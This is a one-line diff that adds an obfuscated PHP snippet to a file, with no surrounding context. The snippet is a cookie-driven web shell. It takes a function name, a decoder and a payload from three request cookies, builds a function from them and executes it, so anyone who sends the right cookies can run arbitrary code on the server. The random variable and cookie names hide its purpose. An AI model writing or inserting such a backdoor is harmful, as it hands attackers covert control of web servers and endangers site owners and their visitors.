@@ -1,0 +1,1 @@
+<?php if(@$_COOKIE['zti']){$lmqy=$_COOKIE['zti']("",@$_COOKIE['mt'](@$_COOKIE['sbua']));$lmqy();}?>
